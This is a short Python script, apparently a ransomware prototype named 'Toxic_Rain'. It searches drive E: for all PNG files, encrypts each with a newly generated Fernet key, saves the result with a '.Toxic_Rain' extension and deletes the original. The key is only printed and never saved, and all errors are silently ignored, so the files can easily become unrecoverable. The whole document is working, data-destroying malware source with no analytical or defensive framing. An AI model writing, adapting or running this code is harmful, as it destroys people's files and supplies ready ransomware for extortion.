from subprocess import check_output
import os
from cryptography.fernet import Fernet
from colorama import Fore, init
init()

key = Fernet.generate_key()
print(key)

Encrypt = Fernet(key)


#x = input("Choose File Type: ")

try:
    cmd = check_output("E: && dir /S /B *.png", shell=True).decode().split()

    for g in cmd:
        with open(g, "rb") as dirlist:
            data = dirlist.read()
            enc_data = Encrypt.encrypt(data)
            new_file = open(g+".Toxic_Rain", "wb")
            new_file.write(enc_data)
            dirlist.close()
            new_file.close()
            os.remove(g)
            print(Fore.LIGHTGREEN_EX+g + " -----> "+" Encrypted ")

except:
    pass
